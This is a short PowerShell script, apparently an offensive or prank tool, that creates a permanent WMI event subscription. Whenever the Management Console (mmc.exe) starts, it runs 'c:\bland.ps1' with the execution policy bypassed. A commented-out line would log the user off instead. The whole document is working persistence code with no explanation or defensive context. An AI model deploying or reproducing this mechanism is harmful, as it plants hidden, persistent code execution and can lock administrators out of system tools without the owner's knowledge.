$type="'win32_process'"
$process="'mmc.exe'"
$q="Select * from __InstanceOperationEvent WITHIN 1 where Targetinstance ISA $type AND Targetinstance.name=$process";
$filterProperty=@{
	Name="MMC Filter"
	EventNamespace="root\cimv2"
	QueryLanguage="WQL"
	Query=$q
}
$filterInstance=Set-WMIInstance -Namespace root/subscription -Class __EventFilter -Property $filterProperty
$consumerProperty=@{
	Name="MMC Consumer";
	CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass c:\bland.ps1";
		#(Get-WmiObject -Class Win32_OperatingSystem).Win32Shutdown(0)
}
$consumerInstance=Set-WMIInstance -Namespace root/subscription -Class CommandLineEventConsumer -Property $consumerProperty
$BoundInstance=Set-WMIInstance -Namespace root/subscription -Class __FiltertoConsumerBinding -Property @{Filter=$filterInstance;Consumer=$consumerInstance}